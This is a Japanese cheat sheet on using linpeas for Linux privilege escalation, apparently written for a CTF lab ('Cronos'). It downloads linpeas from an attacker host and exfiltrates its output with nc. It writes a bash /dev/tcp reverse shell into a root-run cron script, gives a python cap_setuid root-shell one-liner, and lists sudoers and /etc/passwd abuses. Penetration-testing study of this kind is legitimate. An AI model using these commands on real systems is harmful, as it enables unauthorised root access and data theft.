# linpeas 使用手順

---

## 1. 攻撃マシンで準備

### linpeas.sh をダウンロード

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

### HTTP サーバーを起動

```bash
python3 -m http.server 8080
```

---

## 2. 被害マシンへ転送

シェルを取得した後、被害マシン側で実行：

```bash
cd /tmp
wget http://<攻撃マシンIP>:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

wget が使えない場合の代替：

```bash
# curl
curl http://<攻撃マシンIP>:8080/linpeas.sh -o linpeas.sh

# fetch
fetch http://<攻撃マシンIP>:8080/linpeas.sh
```

---

## 3. 出力の読み方

linpeas は危険度を色で表示する。

| 色 | 意味 |
|---|---|
| 赤（太字） | 高確率で権限昇格に使える |
| 赤 | 注意が必要 |
| 黄色 | 確認推奨 |
| 緑 | 情報として参考 |

---

## 4. 注目するセクション

### Cron jobs

```
[+] Cron jobs
* * * * * root php /var/www/laravel/artisan schedule:run
```

root が定期実行しているスクリプトを確認する。

### Writable files

```
[+] Writable files outside user's home
/var/www/laravel/artisan
```

root が実行するファイルに書き込み権限があれば即 root につながる。

### sudo -l

```
[+] Sudo version
[+] We can sudo without password: /usr/bin/vim
```

パスワードなしで実行できるコマンドを確認する。

### SUID binaries

```
[+] SUID - Check easy privesc, exploits and write perms
/usr/bin/passwd
/usr/bin/sudo
/custom/binary   ← カスタムバイナリは特に注意
```

### Capabilities

```
[+] Capabilities
/usr/bin/python3 cap_setuid=ep   ← これがあれば即 root
```

---

## 5. 出力をファイルに保存する

出力が長いため、ファイルに保存して後から確認する方法が便利：

```bash
./linpeas.sh | tee /tmp/linpeas_output.txt
```

攻撃マシンで受け取る場合：

```bash
# 攻撃マシンで nc で待機
nc -lvnp 9999 > linpeas_output.txt

# 被害マシンから送信
./linpeas.sh | nc <攻撃マシンIP> 9999
```

---

## 6. Cronos での実例

linpeas を実行すると以下が赤くハイライトされる：

```
[+] Cron jobs
* * * * * root php /var/www/laravel/artisan schedule:run

[+] Writable files outside user's home
/var/www/laravel/artisan
```

この2点から攻略方針が決まる：

```bash
# artisan にリバースシェルを書き込む
echo "<?php exec('bash -c \"bash -i >& /dev/tcp/<攻撃マシンIP>/5555 0>&1\"'); ?>" > /var/www/laravel/artisan

# 攻撃マシンで待機
nc -lvnp 5555

# 1分以内に root シェルが取得できる
```


```bash
rm /tmp/linpeas.sh
```

```
フローチャート
linpeas の赤い出力を見る
        ↓
sudo に NOPASSWD がある → GTFOBins を確認 → 載っていれば使える
        ↓ なければ
Cron に root 実行のスクリプトがある → 書き込めるか確認 → 書き込めれば使える
        ↓ なければ
SUID に珍しいバイナリがある → GTFOBins を確認 → 載っていれば使える
        ↓ なければ
cap_setuid がある → 即使える
        ↓ なければ
/etc/passwd や /etc/sudoers に書き込める → 即使える
```

# linpeas grep チートシート

判断フローチャートの順番に確認する。

---

## 事前準備　出力をファイルに保存

```bash
./linpeas.sh | tee /tmp/out.txt
```

---

## ① sudo

```bash
grep -A 10 "Sudo version\|NOPASSWD\|sudoers" /tmp/out.txt
```

**使える** → `NOPASSWD` の横のコマンドを GTFOBins で検索

---

## ② Cron

```bash
grep -A 20 "Cron jobs" /tmp/out.txt
```

**使える** → root が実行しているスクリプトのパスをメモして③へ

---

## ③ Cron で見つけたスクリプトに書き込めるか

```bash
# ② で見つけたパスを確認
ls -la /見つけたパス

# 書き込み権限があるか（w が自分のところにあるか）
# -rwxr-xr-x  → 書き込めない
# -rwxrwxr-x  → 書き込める ← 使える
```

---

## ④ SUID

```bash
grep -A 30 "SUID\|SGID" /tmp/out.txt
```

**使える** → `/opt` `/home` `/tmp` 以下の見慣れないバイナリを GTFOBins で検索

---

## ⑤ Capabilities

```bash
grep -A 10 "Capabilities" /tmp/out.txt
```

**使える** → `cap_setuid` または `cap_sys_admin` が出たら即 root

```bash
# cap_setuid の悪用例
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## ⑥ 書き込み可能な重要ファイル

```bash
grep -E "/etc/passwd|/etc/sudoers|/etc/crontab|/root/" /tmp/out.txt
```

**使える** → 以下のファイルが出たら即 root

| ファイル | 攻略方法 |
|---|---|
| `/etc/passwd` | パスワードなしの root ユーザーを追加 |
| `/etc/sudoers` | 自分に NOPASSWD を追加 |
| `/etc/crontab` | リバースシェルを追記 |
| `/root/.bashrc` | root ログイン時に実行されるコマンドを追記 |

---

## まとめて一気に確認

```bash
grep -E "NOPASSWD|Cron jobs|cap_setuid|cap_sys_admin|/etc/passwd|/etc/sudoers|SUID" /tmp/out.txt
```
